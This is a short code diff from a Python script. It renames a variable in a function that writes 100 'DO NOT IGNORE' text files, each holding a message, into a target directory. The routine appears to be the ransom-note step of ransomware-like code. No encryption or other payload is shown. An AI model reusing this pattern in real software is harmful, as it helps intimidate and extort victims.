@@ -119,7 +119,7 @@ def end_process(DPath_):
     for i in range(1,101):
         msgpath = os.path.join(DPath_, f"DO NOT IGNORE{i}.txt")
         with open(msgpath, "w") as msg_write:
-            msg_write.write(YOUR_MESSAGE)
+            msg_write.write(MESSAGE)
     
 if __name__ == '__main__':
     exit()
